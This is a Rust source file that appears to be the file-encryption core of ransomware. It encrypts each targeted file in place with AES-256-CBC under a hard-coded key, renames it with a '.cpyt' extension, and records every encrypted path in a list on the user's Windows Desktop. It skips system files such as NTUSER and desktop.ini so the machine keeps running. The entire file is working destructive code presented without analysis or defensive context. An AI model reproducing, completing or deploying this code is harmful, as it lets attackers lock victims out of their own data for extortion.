use std::{fs, io::Write, path::Path};

use libaes::Cipher;

pub fn init(path: &String) {
    let exe = std::env::current_exe().unwrap().display().to_string();
    if !path.contains("desktop.ini")
        && !path.contains(&exe)
        && !path.contains("ntuser")
        && !path.contains("NTUSER")
    {
        let key = b"77892KGGBQL4Bg8tRshSk8DDEppFuwz7"; // Yes, the keys have to be hard-coded.
        let iv = b"hUbnysDRJN8Mkf52";
        let file_content = fs::read(path).unwrap();

        let cipher = Cipher::new_256(key);

        let encrypted = cipher.cbc_encrypt(iv, &file_content);
        fs::write(path, encrypted).unwrap();
        fs::rename(path, format!("{}.cpyt", path)).unwrap();

        doc(path);
    }
}

fn doc(path: &String) {
    let filepath_string = format!(
        r"C:\Users\{}\Desktop\encrypted_files.txt",
        whoami::username()
    );
    let filepath = Path::new(&filepath_string);

    if !filepath.exists() {
        let mut file = fs::File::create(filepath).unwrap();
        fs::File::write_all(
            &mut file,
            b"Here is an overview over your encrypted files.\n\n",
        )
        .unwrap();
    }

    let mut file = fs::OpenOptions::new()
        .write(true)
        .append(true)
        .open(filepath)
        .unwrap();

    file.write_all(format!("{}\n", path).as_bytes()).unwrap();
}
